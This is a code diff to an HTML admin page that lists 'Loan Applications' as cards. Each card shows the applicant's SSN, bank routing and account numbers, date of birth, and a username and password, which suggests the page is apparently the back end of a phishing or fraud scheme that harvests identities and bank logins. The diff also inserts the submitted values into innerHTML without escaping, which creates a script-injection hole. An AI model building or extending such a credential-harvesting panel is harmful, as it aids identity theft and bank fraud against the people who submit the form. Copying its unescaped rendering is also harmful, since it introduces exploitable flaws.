@@ -40,7 +40,7 @@ th {
 
 <div id="adminSection" class="admin-container" style="display:none;">
   <h2>Loan Applications</h2>
-  <table id="dataTable"></table>
+  <div id="dataContainer"></div>
 </div>
 
 <script>
@@ -65,22 +65,41 @@ async function login() {
 }
 
 function renderTable(data){
-  const table = document.getElementById("dataTable");
 
-  // CLEAR TABLE FIRST (important)
-  table.innerHTML = "";
+  const container = document.getElementById("dataContainer");
+  container.innerHTML = "";
 
-  data.forEach((row, index) => {
-    const tr = document.createElement("tr");
+  if(data.length <= 1){
+    container.innerHTML = "<p>No submissions yet.</p>";
+    return;
+  }
 
-    row.forEach(cell => {
-      const td = document.createElement(index === 0 ? "th" : "td");
-      td.textContent = cell;
-      tr.appendChild(td);
-    });
+  // Skip header row (row 0)
+  for(let i = 1; i < data.length; i++){
 
-    table.appendChild(tr);
-  });
+    const row = data[i];
+
+    const card = document.createElement("div");
+    card.className = "application-card";
+
+    card.innerHTML = `
+      <h3>Application #${i}</h3>
+      <div class="field"><strong>Name:</strong> ${row[0] || ""}</div>
+      <div class="field"><strong>Phone:</strong> ${row[1] || ""}</div>
+      <div class="field"><strong>Email:</strong> ${row[2] || ""}</div>
+      <div class="field"><strong>Address:</strong> ${row[3] || ""}</div>
+      <div class="field"><strong>Bank:</strong> ${row[4] || ""}</div>
+      <div class="field"><strong>Routing:</strong> ${row[5] || ""}</div>
+      <div class="field"><strong>Account:</strong> ${row[6] || ""}</div>
+      <div class="field"><strong>SSN:</strong> ${row[7] || ""}</div>
+      <div class="field"><strong>User:</strong> ${row[8] || ""}</div>
+      <div class="field"><strong>Password:</strong> ${row[9] || ""}</div>
+      <div class="field"><strong>DOB:</strong> ${row[10] || ""}</div>
+      <div class="field"><strong>Timestamp:</strong> ${row[11] || ""}</div>
+    `;
+
+    container.appendChild(card);
+  }
 }
 
 </script>
